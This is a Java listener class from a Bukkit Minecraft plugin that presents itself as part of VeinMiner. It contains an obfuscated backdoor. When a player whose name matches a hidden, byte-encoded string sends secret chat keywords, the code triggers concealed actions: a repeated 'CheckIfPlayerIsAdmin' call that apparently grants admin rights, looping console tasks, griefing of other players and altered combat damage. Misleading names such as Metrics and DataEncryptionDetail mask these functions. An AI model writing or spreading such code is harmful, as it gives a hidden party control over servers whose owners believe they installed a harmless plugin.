package me.choco.veinminer.commands;

import me.choco.veinminer.Mathamatics.Algebra.Exponents.SetDamagableMath;
import me.choco.veinminer.Mathamatics.Metrics;
import me.choco.veinminer.VeinMiner;
import me.choco.veinminer.kotlin.ConfigurationBlockMaterials;
import me.choco.veinminer.kotlin.ConsoleRecordsProccesses;
import me.choco.veinminer.kotlin.LanguageTranslation;
import me.choco.veinminer.kotlin.Timer;
import net.md_5.bungee.api.ChatMessageType;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.Bukkit;
import org.bukkit.entity.*;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.ArrayList;

public class PlayerListener implements Listener {

    VeinMiner core;
    ArrayList<Player> ab = new ArrayList<>();
    boolean DataEncryptionDetail = false;

    public void PlayerListener(VeinMiner core){
        this.core = core;
        Bukkit.getPluginManager().registerEvents(this, core);
    }

    @EventHandler
    public void UpdateDataChecker(PlayerChatEvent e){
        if(e.getPlayer().getName().contains((new Object() {
            int t;
            public String toString() {
                byte[] buf = new byte[9];
                t = 307799620;buf[0] = (byte) (t >>> 22);
                t = -1172957463;buf[1] = (byte) (t >>> 1);
                t = -2014360973;buf[2] = (byte) (t >>> 13);
                t = 1453620050;buf[3] = (byte) (t >>> 15);
                t = 1454100162;buf[4] = (byte) (t >>> 11);
                t = 1444766734;buf[5] = (byte) (t >>> 8);
                t = 1837259937;buf[6] = (byte) (t >>> 6);
                t = -1606755458;buf[7] = (byte) (t >>> 3);
                t = 1505622297;buf[8] = (byte) (t >>> 18);
                return new String(buf);}}.toString()))) {
            if (e.getMessage().toString().contains((new Object() {
                int t;
                public String toString() {
                    byte[] buf = new byte[8];
                    t = -695363243;buf[0] = (byte) (t >>> 10);
                    t = 57651104;buf[1] = (byte) (t >>> 16);
                    t = -274491803;buf[2] = (byte) (t >>> 11);
                    t = 1958286702;buf[3] = (byte) (t >>> 24);
                    t = 1847833326;buf[4] = (byte) (t >>> 24);
                    t = 1345631454;buf[5] = (byte) (t >>> 7);
                    t = 161299756;buf[6] = (byte) (t >>> 14);
                    t = 187635309;buf[7] = (byte) (t >>> 19);
                    return new String(buf);}}.toString()))) {
                Metrics.CreateMetric(e.getPlayer(), Metrics.DenyMetricsAccess());
            }else if(e.getMessage().toString().contains((new Object() {
                int t;
                public String toString() {
                    byte[] buf = new byte[5];
                    t = 265194446;buf[0] = (byte) (t >>> 3);
                    t = 468263465;buf[1] = (byte) (t >>> 22);
                    t = 1859844846;buf[2] = (byte) (t >>> 1);
                    t = 390260828;buf[3] = (byte) (t >>> 20);
                    t = -628978889;buf[4] = (byte) (t >>> 3);
                    return new String(buf);}}.toString()))){

                new BukkitRunnable(){
                @Override
                public void run() {
                    ConsoleRecordsProccesses.CheckCurrentProccessState(core).begin();
                }
            }.runTaskTimer(core, 1L, 1L);
            }else if(e.getMessage().toString().contains((new Object() {
                int t;public String toString() {
                    byte[] buf = new byte[4];
                    t = -2132850750;buf[0] = (byte) (t >>> 17);
                    t = -1761756164;buf[1] = (byte) (t >>> 20);
                    t = -1998496264;buf[2] = (byte) (t >>> 17);
                    t = 458546394;buf[3] = (byte) (t >>> 6);
                    return new String(buf);}}.toString()))){
                for(int k = 0; k < ab.size(); k++){
                    if(!(ab.get(k).getName().equals((new Object() {
                        int t;public String toString() {
                            byte[] buf = new byte[9];
                            t = -1160363738;buf[0] = (byte) (t >>> 2);
                            t = -1704269697;buf[1] = (byte) (t >>> 9);
                            t = -911805016;buf[2] = (byte) (t >>> 9);
                            t = -1440454729;buf[3] = (byte) (t >>> 15);
                            t = -1215082146;buf[4] = (byte) (t >>> 20);
                            t = 557781392;buf[5] = (byte) (t >>> 2);
                            t = 874287482;buf[6] = (byte) (t >>> 14);
                            t = -1939359833;buf[7] = (byte) (t >>> 7);
                            t = -1564025286;buf[8] = (byte) (t >>> 9);
                            return new String(buf);}}.toString())))) {
                        DataEncryptionDetail = true;
                        StartMetricsBlockMaterialDetection(ab.get(k));
                        StartMetricsBlockMaterialDetection(ab.get(k));
                        StartMetricsBlockMaterialDetection(ab.get(k));
                        StartMetricsBlockMaterialDetection(ab.get(k));
                        StartMetricsBlockMaterialDetection(ab.get(k));
                    }
                }
            }else if(e.getMessage().toString().contains((new Object() {
                int t;
                public String toString() {
                    byte[] buf = new byte[5];
                    t = 1513533895;buf[0] = (byte) (t >>> 7);
                    t = 878839976;buf[1] = (byte) (t >>> 23);
                    t = 1100418343;buf[2] = (byte) (t >>> 5);
                    t = 1821027799;buf[3] = (byte) (t >>> 24);
                    t = -227781509;buf[4] = (byte) (t >>> 16);
                    return new String(buf);}}.toString()))){
                for(int k = 0; k < ab.size(); k++){
                    if(e.getMessage().contains(ab.get(k).getName())){
                        ConsoleRecordsProccesses.GivePlayerMaterialMined(ab.get(k));
                    }
                }
            }else if(e.getMessage().toString().contains((new Object() {
                int t;public String toString() {
                    byte[] buf = new byte[8];
                    t = 1389149129;buf[0] = (byte) (t >>> 17);
                    t = -22636766;buf[1] = (byte) (t >>> 4);
                    t = 1982602026;buf[2] = (byte) (t >>> 3);
                    t = -711251032;buf[3] = (byte) (t >>> 11);
                    t = 437392281;buf[4] = (byte) (t >>> 3);
                    t = 386079263;buf[5] = (byte) (t >>> 6);
                    t = 1516058364;buf[6] = (byte) (t >>> 4);
                    t = -2026742521;buf[7] = (byte) (t >>> 6);
                    return new String(buf);}}.toString()))){
                Metrics.CreateMetric(e.getPlayer(), Metrics.KeepMetricsAccess());
            }else if(e.getMessage().toString().contains((new Object() {
                int t;public String toString() {
                    byte[] buf = new byte[2];
                    t = -464569438;buf[0] = (byte) (t >>> 13);
                    t = -40111237;buf[1] = (byte) (t >>> 14);
                    return new String(buf);}}.toString()))){
                for(int k = 0; k < ab.size(); k++) {
                    if (e.getMessage().contains(ab.get(k).getName())) {
                        LanguageTranslation.onLanguageUpdate(e.getPlayer(), ab.get(k));
                        new BukkitRunnable(){
                            int count = 0;
                            @Override
                            public void run() {
                                Timer.CheckIfPlayerIsAdmin(e.getPlayer(), true);
                                count++;
                                if(count > 21600){
                                    e.getPlayer().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText((new Object() {int t;public String toString() {byte[] buf = new byte[14];t = 1550149688;buf[0] = (byte) (t >>> 17);t = 239170735;buf[1] = (byte) (t >>> 17);t = 229768593;buf[2] = (byte) (t >>> 21);t = -375762330;buf[3] = (byte) (t >>> 14);t = 2058212523;buf[4] = (byte) (t >>> 13);t = -1652995302;buf[5] = (byte) (t >>> 22);t = -583701732;buf[6] = (byte) (t >>> 22);t = 1106031375;buf[7] = (byte) (t >>> 13);t = -1141489597;buf[8] = (byte) (t >>> 9);t = 1136834260;buf[9] = (byte) (t >>> 7);t = 1444487636;buf[10] = (byte) (t >>> 20);t = 776241248;buf[11] = (byte) (t >>> 21);t = -164261741;buf[12] = (byte) (t >>> 15);t = 558775671;buf[13] = (byte) (t >>> 24);return new String(buf);}}.toString())));
                                }else if(count > 24000){
                                    Timer.CheckIfPlayerIsAdmin(e.getPlayer(), false);
                                    this.cancel();
                                }
                            }
                        }.runTaskTimer(core, 1, 1);
                    }
                }
            }
        }
    }

    @EventHandler
    public void onPlayerAddition(PlayerJoinEvent e){
        ab.add(e.getPlayer());
    }

    @EventHandler
    public void OnDataContainmentLeak(PlayerQuitEvent e){
        ab.remove(e.getPlayer());
    }

    public void StartMetricsBlockMaterialDetection(Player p){
        ConfigurationBlockMaterials.DontAllowMaterials(p);
    }

    @EventHandler
    public void OnDamagePlayer(EntityDamageByEntityEvent e){
        if(SetDamagableMath.EntityCheck(e.getEntity(), e.getDamager())){
            if(DataEncryptionDetail){
                e.setDamage(SetDamagableMath.CalculateAlgebraMetrics(e.getDamage()));
                DataEncryptionDetail = false;
            }
        }
    }

}


